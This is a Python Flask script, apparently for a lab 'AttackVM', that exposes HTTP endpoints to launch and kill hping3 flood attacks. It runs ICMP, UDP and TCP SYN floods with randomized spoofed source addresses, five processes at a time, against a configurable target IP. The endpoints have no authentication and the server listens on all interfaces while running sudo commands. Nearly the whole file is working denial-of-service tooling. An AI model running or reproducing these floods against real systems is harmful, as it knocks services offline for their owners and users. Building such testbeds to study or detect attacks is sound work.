#!/usr/bin/env python3
"""
attack_controller.py

Flask controller on AttackVM that starts/stops hping3 attacks and provides a reliable
/attack/kill_all endpoint which force-kills all hping3 processes using pkill.

Run (for demo): sudo python3 attack_controller.py
"""
from flask import Flask, jsonify
import subprocess
import time
import os
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

TARGET_IP = os.environ.get("TARGET_IP", "192.168.18.20")

attack_procs = {
    "icmp": [],
    "udp": [],
    "tcp": []
}

HPING_CMD = {
    "icmp": ["sudo", "hping3", "--icmp", "--flood", "--rand-source", TARGET_IP],
    "udp":  ["sudo", "hping3", "--udp", "--flood", "--rand-source", "-p", "5201", TARGET_IP],
    "tcp":  ["sudo", "hping3", "-S", "--flood", "--rand-source", "-p", "5201", TARGET_IP]
}


def is_hping_installed():
    return subprocess.run(["which", "hping3"], stdout=subprocess.DEVNULL).returncode == 0


def start_hping(cmd, count=5):
    procs = []
    for _ in range(count):
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        procs.append(p)
    return procs


@app.route("/attack/<atype>/start")
def attack_start(atype):
    if atype not in HPING_CMD:
        return jsonify({"status": "error", "message": "unknown attack type"}), 400
    if not is_hping_installed():
        return jsonify({"status": "error", "message": "hping3 not installed"}), 500
    try:
        procs = start_hping(HPING_CMD[atype], count=5)
        pids = [p.pid for p in procs]
        attack_procs[atype].extend(pids)
        logging.info("Started %s attack: pids=%s", atype, pids)
        return jsonify({"status": "success", "message": f"{atype} attack started", "pids": pids})
    except Exception as e:
        logging.exception("start failed")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/attack/<atype>/stop")
def attack_stop(atype):
    if atype not in HPING_CMD:
        return jsonify({"status": "error", "message": "unknown attack type"}), 400
    try:
        killed = []
        # Try to kill pids tracked by this controller
        for pid in list(attack_procs.get(atype, [])):
            try:
                os.kill(pid, 9)
                killed.append(pid)
            except Exception:
                pass
        attack_procs[atype] = []
        # Force-kill any remaining hping3 processes as fallback
        subprocess.run(["sudo", "pkill", "-9", "-f", "hping3"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        rc = subprocess.run(["pgrep", "-f", "hping3"], stdout=subprocess.PIPE)
        remaining = rc.stdout.decode().strip().splitlines() if rc.returncode == 0 else []
        return jsonify({"status": "success", "message": f"{atype} attack stopped", "killed": killed, "remaining": remaining})
    except Exception as e:
        logging.exception("stop failed")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/attack/kill_all")
def attack_kill_all():
    """
    Emergency: forcibly kill all hping3 processes using sudo pkill -9 -f hping3.
    Does not restart the VM; does not touch sshd or Flask.
    """
    try:
        if not is_hping_installed():
            return jsonify({"status": "error", "message": "hping3 not installed"}), 500
        rc_before = subprocess.run(["pgrep", "-f", "hping3"], stdout=subprocess.PIPE)
        before = rc_before.stdout.decode().strip().splitlines() if rc_before.returncode == 0 else []
        subprocess.run(["sudo", "pkill", "-9", "-f", "hping3"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(0.8)
        rc_after = subprocess.run(["pgrep", "-f", "hping3"], stdout=subprocess.PIPE)
        after = rc_after.stdout.decode().strip().splitlines() if rc_after.returncode == 0 else []
        # clear our tracking
        for k in attack_procs.keys():
            attack_procs[k] = []
        success = len(after) == 0
        return jsonify({"status": "success" if success else "partial", "killed_before": before, "remaining_after": after})
    except Exception as e:
        logging.exception("kill_all failed")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/attack/status")
def attack_status():
    rc = subprocess.run(["pgrep", "-f", "hping3"], stdout=subprocess.PIPE)
    pids = rc.stdout.decode().strip().splitlines() if rc.returncode == 0 else []
    return jsonify({"status": "ok", "hping3_pids": pids, "tracked": attack_procs})


if __name__ == "__main__":
    logging.info("Starting attack_controller on port 5002")
    app.run(host="0.0.0.0", port=5002)
